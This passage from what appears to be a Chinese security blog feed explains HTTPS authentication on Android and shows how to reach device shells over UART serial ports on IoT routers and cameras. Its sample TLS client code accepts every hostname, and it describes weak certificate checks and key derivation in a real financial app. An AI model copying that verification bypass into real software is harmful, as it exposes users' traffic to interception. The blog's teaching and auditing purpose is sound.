<h2 id="数据裸奔时代"><a href="#数据裸奔时代" class="headerlink" title="数据裸奔时代"></a>数据裸奔时代</h2><h3 id="使用http协议的数据传输方式"><a href="#使用http协议的数据传输方式" class="headerlink" title="使用http协议的数据传输方式"></a>使用http协议的数据传输方式</h3><p>HyperText Transfer Protocol，超文本传输协议，是互联网上使用最广泛的一种协议，所有WWW文件必须遵循的标准。HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全。<br>使用TCP端口为：80<br>最初的移动app开发过程中，使用的大部分http协议来进行客户端跟服务端的通信。这个过程中传输的信息都是明文，继而引发了一系列的信息泄露等漏洞.<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/httpa.png" alt="img"><br>wireshark简单捕获就能看到明文隐私数据<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/httpb.png" alt="img"><br>当然上述极为不安全的数据传输，在2015年被大量爆出来之后，立即引起了app的开发人员以及使用着的重视。后续的数据传输使用了相对安全的基于SSL/TLS加密的安全的超文本传输协议https。</p>
<h2 id="你所使用的加密数据传输真的有保证你的数据不被窃取吗？"><a href="#你所使用的加密数据传输真的有保证你的数据不被窃取吗？" class="headerlink" title="你所使用的加密数据传输真的有保证你的数据不被窃取吗？"></a>你所使用的加密数据传输真的有保证你的数据不被窃取吗？</h2><h3 id="https加密传输"><a href="#https加密传输" class="headerlink" title="https加密传输"></a>https加密传输</h3><p>Hyper Text Transfer Protocol over Secure Socket Layer，安全的超文本传输协议，网景公式设计了SSL(Secure Sockets Layer)协议用于对Http协议传输的数据进行加密，保证会话过程中的安全性。<br>使用TCP端口默认为443<br>SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密。<br>对称加密</p>
<p>速度高，可加密内容较大，用来加密会话过程中的消息<br>公钥加密 加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥</p>
<h3 id="HTTPs单向认证机制"><a href="#HTTPs单向认证机制" class="headerlink" title="HTTPs单向认证机制"></a>HTTPs单向认证机制</h3><p>单向认证主要是客户端保存有服务端的公钥证书，自己本身是没有私钥证书的。<br>1、给服务器生成密钥方式：<br>keytool -genkeypair -alias skxy -keyalg RSA -validity 3650 -keypass 123456 -storepass 123456 -keystore skxy.keystore<br>2、给Tomcat服务器配置Https<br>tomcat/config/server.xml修改connector配置<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Connector port=<span class="string">"8443"</span> protocol=<span class="string">"org.apache.coyote.http11.Http11Protocol"</span></div><div class="line">        maxThreads=<span class="string">"150"</span> SSLEnabled=<span class="string">"true"</span> scheme=<span class="string">"https"</span> secure=<span class="string">"true"</span></div><div class="line">        clientAuth=<span class="string">"false"</span> sslProtocol=<span class="string">"TLS"</span></div><div class="line">        keystoreFile=<span class="string">"conf/skxy.keystore"</span></div><div class="line">        keystorePass=<span class="string">"123456"</span>/&gt;</div></pre></td></tr></table></figure></p>
<p>3、导出证书<br>keytool -export -alias skxy -file skxy.cer -keystore skxy.keystore -storepass 123456<br>4、将证书放在android客户端，能够读取的地方比如assert目录 5.代码中执行网络请求，获取证书，读取https网站的数据。<br>客户端单向认证代码实现部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">String path = <span class="string">"https://10.0.3.2:8443/Test/Hlloer"</span>;</div><div class="line">?</div><div class="line">   <span class="keyword">try</span> &#123;  </div><div class="line">       <span class="comment">//获取证书  </span></div><div class="line">       InputStream stream = getAssets().open(<span class="string">"skxy.cer"</span>);  </div><div class="line">       SSLContext tls = SSLContext.getInstance(<span class="string">"TLS"</span>);  </div><div class="line">       <span class="comment">//使用默认证书  </span></div><div class="line">       KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());  </div><div class="line">       <span class="comment">//去掉系统默认证书  </span></div><div class="line">       keystore.load(<span class="keyword">null</span>);  </div><div class="line">       Certificate certificate =            CertificateFactory.getInstance(<span class="string">"X.509"</span>).generateCertificate(stream);  </div><div class="line">       <span class="comment">//设置自己的证书  </span></div><div class="line">       keystore.setCertificateEntry(<span class="string">"skxy"</span>, certificate);  </div><div class="line">       <span class="comment">//通过信任管理器获取一个默认的算法  </span></div><div class="line">       String algorithm = TrustManagerFactory.getDefaultAlgorithm();  </div><div class="line">       <span class="comment">//算法工厂创建  </span></div><div class="line">       TrustManagerFactory instance = TrustManagerFactory.getInstance(algorithm);  </div><div class="line">       instance.init(keystore);  </div><div class="line">       tls.init(<span class="keyword">null</span>, instance.getTrustManagers(), <span class="keyword">null</span>);  </div><div class="line">       SSLSocketFactory socketFactory = tls.getSocketFactory();  </div><div class="line">       HttpsURLConnection.setDefaultSSLSocketFactory(socketFactory);  </div><div class="line">       URL url = <span class="keyword">new</span> URL(path);  </div><div class="line">       HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();  </div><div class="line">       <span class="comment">//设置ip授权认证：如果已经安装该证书，可以不设置，否则需要设置  </span></div><div class="line">       conn.setHostnameVerifier(<span class="keyword">new</span> HostnameVerifier() &#123;  </div><div class="line">           @Override  </div><div class="line">           <span class="keyword">public</span> boolean verify(String hostname, SSLSession session) &#123;  </div><div class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;  </div><div class="line"></div><div class="line">           &#125;  </div><div class="line"></div><div class="line">       &#125;);  </div><div class="line">       InputStream inputStream = conn.getInputStream();  </div><div class="line">       String result = getString(inputStream);  </div><div class="line">       stream.close();</div></pre></td></tr></table></figure></p>
<h3 id="单向认证过程："><a href="#单向认证过程：" class="headerlink" title="单向认证过程："></a>单向认证过程：</h3><p>(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。<br>(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书<br>(3) 客户端使用服务端返回的信息验证服务器的合法性，包括：<br> 1.证书是否过期<br> 2.发型服务器证书的CA是否可靠<br> 3.返回的公钥是否能正确解开返回证书中的数字签名<br> 4.服务器证书上的域名是否和服务器的实际域名相匹配<br> 5.验证通过后，将继续进行通信，否则，终止通信<br>(4) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择<br>(5) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。<br>(6) 服务器将选择好的加密方案通过明文方式返回给客户端<br>(7) 客户端接收到服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器<br>(8) 服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。<br>在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</p>
<h3 id="Https双向认证机制"><a href="#Https双向认证机制" class="headerlink" title="Https双向认证机制"></a>Https双向认证机制</h3><p>首先对于双向证书验证，也就是说，客户端有自己的密钥，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。<br>客户端双向认证代码实现部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySSLSocketFactory</span> </span>&#123;</div><div class="line">?</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TYPE_BKS = <span class="string">"bks"</span>;<span class="comment">//证书类型</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TYPE_P12 = <span class="string">"PKCS12"</span>;<span class="comment">//证书类型</span></div><div class="line">?</div><div class="line">?</div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_PASSWORD = <span class="string">"****"</span>;<span class="comment">//证书密码（应该是客户端证书密码）</span></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String KEY_STORE_TRUST_PASSWORD = <span class="string">"***"</span>;<span class="comment">//授信证书密码（应该是服务端证书密码）</span></div><div class="line">?</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SSLSocketFactory getSocketFactory(Context context) &#123;</div><div class="line">?</div><div class="line">?</div><div class="line">        InputStream trust_input = context.getResources().openRawResource(R.raw.trust);<span class="comment">//服务器授信证书</span></div><div class="line">        InputStream client_input = context.getResources().openRawResource(R.raw.client);<span class="comment">//客户端证书</span></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">                    SSLContext sslContext = SSLContext.getInstance(<span class="string">"TLS"</span>); </div><div class="line">                    KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">                    trustStore.load(trust_input, KEY_STORE_TRUST_PASSWORD.toCharArray()); </div><div class="line">                    KeyStore keyStore = KeyStore.getInstance(KEY_STORE_TYPE_P12);  </div><div class="line">                    keyStore.load(client_input, KEY_STORE_PASSWORD.toCharArray());</div><div class="line">                    TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());</div><div class="line">                    trustManagerFactory.init(trustStore);</div><div class="line">                    KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());</div><div class="line">                   keyManagerFactory.init(keyStore, KEY_STORE_PASSWORD.toCharArray());</div><div class="line">                   sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), <span class="keyword">new</span> SecureRandom());</div><div class="line">                   SSLSocketFactory factory = sslContext.getSocketFactory();</div><div class="line">                   <span class="keyword">return</span> factory;</div><div class="line">               &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> e) &#123;</div><div class="line">                           e.printStackTrace(); </div><div class="line">                          <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">               &#125; <span class="keyword">finally</span> &#123; </div><div class="line">                          <span class="keyword">try</span> &#123;</div><div class="line">                                trust_input.close(); </div><div class="line">                               client_input.close();</div><div class="line">                          &#125; <span class="keyword">catch</span> (IOException e) &#123; </div><div class="line">                               e.printStackTrace();  </div><div class="line">                         &#125; </div><div class="line">               &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="双向认证过程："><a href="#双向认证过程：" class="headerlink" title="双向认证过程："></a>双向认证过程：</h3><p>(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。<br>(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书<br> 客户端使用服务端返回的信息验证服务器的合法性，包括：<br> 1.证书是否过期<br> 2.发型服务器证书的CA是否可靠<br> 3.返回的公钥是否能正确解开返回证书中的数字签名<br> 4.服务器证书上的域名是否和服务器的实际域名相匹配<br>(3) 验证通过后，将继续进行通信，否则，终止通信<br>(4) 服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端<br>(5) 验证客户端的证书，通过验证后，会获得客户端的公钥<br>(6) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择<br>(7) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式<br>(8) 将加密方案通过使用之前获取到的公钥进行加密，返回给客户端<br>(9) 客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端<br>(10) 服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</p>
<h2 id="我们身边的app中所使用的加密传输是怎样的呢？"><a href="#我们身边的app中所使用的加密传输是怎样的呢？" class="headerlink" title="我们身边的app中所使用的加密传输是怎样的呢？"></a>我们身边的app中所使用的加密传输是怎样的呢？</h2><p>某宝（金融类app）的数据加密分析（https单向认证） 为了更加清晰的了解https在实际项目中的应用，特意花了点时间分析了一个app的加密认证过程。app虽然加了部分混淆，但并没有加固，所以也不难分析。<br>（1）整个发送https post请求过程.ip以及域名都是固定的，证书也写死在app里。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/https_post.png" alt="img"><br>（2）https认证过程<br>判断代理服务器以及证书校验<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/https.png" alt="img"><br>证书校验过程<br>在获取证书的过程中，仅仅读取了证书的信息，并没有实现校验证书是否安全可靠的代码。这里就留下了安全隐患。使用第三方证书一样可以截获数据。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/setcer.png" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/getcer.png" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/iscer.png" alt="img"><br>数据解密过程<br>在数据解密过程也不够严谨，密钥和向量通过简单逆向分析就能获得。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/desDecode.png" alt="img"><br>解密key的获取方式：数据包名的md5<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/decode2.png" alt="img"><br>解密向量<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/decodeiv.png" alt="img"><br>通过这个简单分析，你还敢说你的数据是安全传输的吗？</p>
<h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><p>因为开发方便而信任所有证书<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/wrong.png" alt="img"><br>重写了校验机制，但并没有做任何检验SSL证书有效性。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/wrong2.png" alt="img"></p>
<h2 id="扩展-Java-Security安全体系知识延伸"><a href="#扩展-Java-Security安全体系知识延伸" class="headerlink" title="扩展 Java Security安全体系知识延伸"></a>扩展 Java Security安全体系知识延伸</h2><h3 id="Java-Security-背景知识"><a href="#Java-Security-背景知识" class="headerlink" title="Java Security 背景知识"></a>Java Security 背景知识</h3><p>Java Security其实是Java平台中一个比较独立的模块。除了软件实现上内容外，它实际上对应了一系列的规范。从Java2开始，Java Security包含主要三个重要的规范：</p>
<p>JavaCryptography Extension（简写为JCE），JCE所包含的内容有加解密，密钥交换，消息摘要（Message Digest，比如MD5等），密钥管理等。本文所涉及的大部分内容都属于JCE的范畴。<br>JavaSecure Socket Extension（简写为JSSE），JSSE所包含的内容就是Java层的SSL/TLS。简单点说，使用JSSE就可以创建SSL/TLS socket了。<br>JavaAuthentication and Authorization Service（简写为JAAS），JSSA和认证/授权有关。这部分内容在客户端接触得会比较少一点，所以本文不拟讨论它。<br>在上述三个子模块或规范中，JCE是JavaSecurity的大头，其他两个子模块JSSE和JAAS都依赖于它，比如SSL/TLS在工作过程中需要使用密钥对数据进行加解密，那么密钥的创建和使用就依靠JCE子模块了。 另外，既然和安全相关，那么对安全敏感的相关部门或政府肯定会有所干涉。Java是在美国被发明的，所以美国政府对于Java Security方面的出口（比如哪些模块，哪些功能能给其他国家使用）有相关的限制。例如，不允许出口的JCE（从软件实现上看，可能就是从Java官网上下载到的几个Jar包文件）支持一些高级的加解密功能（比如在密钥长度等方面有所限制）。</p>
<h3 id="JCE的介绍"><a href="#JCE的介绍" class="headerlink" title="JCE的介绍"></a>JCE的介绍</h3><p>JCE最初是作为JCA的扩展包开发的，旨在提供受美国出口控制条例管制的加密服务API和实现。JCE提供一个提供者实现和一组相关的API和包，以支持加密和解密，密钥的生成和协商以及消息验证算法，其中对加密和解密的支持包括对称加密、非对称加密、块加密和流加密。JCE还支持安全流和封装流对象。<br>JCE的架构模型如下图所示：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/jce.jpg" alt="img"></p>
<h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><p>1.不要忽略证书校验</p>
<p>2.保护好自己的密钥</p>
<p>3.尽量使用规范的https协议</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1.<a href="http://blog.csdn.net/xdd19910505/article/details/51926540" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/xdd19910505/article/details/51926540</a></p>
<p>2.<a href="https://www.cnblogs.com/xiekeli/p/5607107.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.cnblogs.com/xiekeli/p/5607107.html</a></p>
<p>3.<a href="http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2014/0607/1621.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2014/0607/1621.html</a></p>
<p>4.<a href="https://www.waitalone.cn/bank-ssl-cap.html" rel="external nofollow noopener noreferrer" target="_blank">https://www.waitalone.cn/bank-ssl-cap.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是今年三月份有关移动市场的统计数据,移动app的数量已经突破10亿。移动安全也成为了一个全民关注的问题。从最初的app只针对功能实现，爆出来了一系列的高危漏洞之后，应运而生了包括移动app检测、app加固保护等工作来保护开发者以及使用者权益。同时，http的明文数据传输问
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssl" scheme="http://www.future-sec.com/tags/ssl/"/>
    
      <category term="https" scheme="http://www.future-sec.com/tags/https/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-串口调试</title>
    <link href="http://www.future-sec.com/iot-security-hardware-debuging.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-debuging.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2018-08-20T11:22:10.646Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。<br>通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。<br>对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别,  以及RS232, TTL等关系,             实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).<br>UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。<br> 在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image32.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image33.jpg" alt=""></p>
<h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image65.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image66.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image67.jpg" alt=""></p>
<p>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image68.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image69.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image70.jpg" alt=""></p>
<p>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image101.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image102.jpg" alt=""></p>
<p>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image71.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image72.jpg" alt=""></p>
<h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image73.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image35.jpg" alt=""></p>
<p>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image74.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image75.jpg" alt=""></p>
<h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image76.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image77.jpg" alt=""></p>
<p>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image78.jpg" alt=""></p>
<h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image79.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image80.jpg" alt=""></p>
<p>设置波特率为57600，串口输出正确，并可执行命令。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image81.jpg" alt=""></p>
<h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image82.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image83.jpg" alt=""></p>
<p>设置波特率为57600，串口输出正确，并可执行命令。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image84.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image85.jpg" alt=""></p>
<p>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image86.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image87.jpg" alt=""></p>
<h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image88.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image89.jpg" alt=""><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image90.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image91.jpg" alt=""></p>
<h3 id="案例六：调试某无线数据终端"><a href="#案例六：调试某无线数据终端" class="headerlink" title="案例六：调试某无线数据终端"></a>案例六：调试某无线数据终端</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image122.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image123.jpg" alt=""></p>
<p>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image124.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image125.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="UART串口调试" scheme="http://www.future-sec.com/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>如何破解一个蓝牙锁</title>
    <link href="http://www.future-sec.com/how-to-crack-a-ble-lock.html"/>
    <id>http://www.future-sec.com/how-to-crack-a-ble-lock.html</id>
